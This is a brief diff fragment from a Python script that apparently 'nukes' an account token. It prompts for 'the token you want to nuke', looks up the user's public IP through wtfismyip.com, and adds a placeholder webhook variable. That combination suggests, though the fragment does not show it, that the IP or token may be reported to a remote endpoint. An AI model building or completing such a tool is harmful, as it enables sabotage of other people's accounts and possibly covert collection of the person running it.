@@ -7,6 +7,8 @@ from ctypes import cdll,byref,c_bool,c_char_p
 import requests
 import os
 
+webhook = ("webhok")
+
 ip = requests.get("https://wtfismyip.com/text").text
 
 token = input("enter the token you want to nuke > ")
